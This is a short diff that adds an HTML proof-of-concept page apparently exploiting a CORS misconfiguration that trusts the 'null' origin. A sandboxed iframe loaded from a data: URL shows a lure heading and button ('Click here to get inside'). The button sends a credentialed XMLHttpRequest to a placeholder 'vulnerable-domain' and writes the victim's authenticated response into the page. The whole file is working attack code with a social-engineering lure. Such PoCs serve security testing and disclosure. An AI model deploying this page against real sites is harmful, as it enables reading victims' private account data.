@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<iframe width="700" height="400" sandbox='allow-scripts allow-forms' src='
+data:text/html,<!DOCTYPE html>
+<div id="demo"><br>
+<h1>We Welcome Great people like You!!!</h1>
+<button type="button" onclick="loadDoc()">Click here to get inside</button>
+</div>
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://vulnerable-domain/", true);
+   xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+'></iframe>
+</body>
+</html>
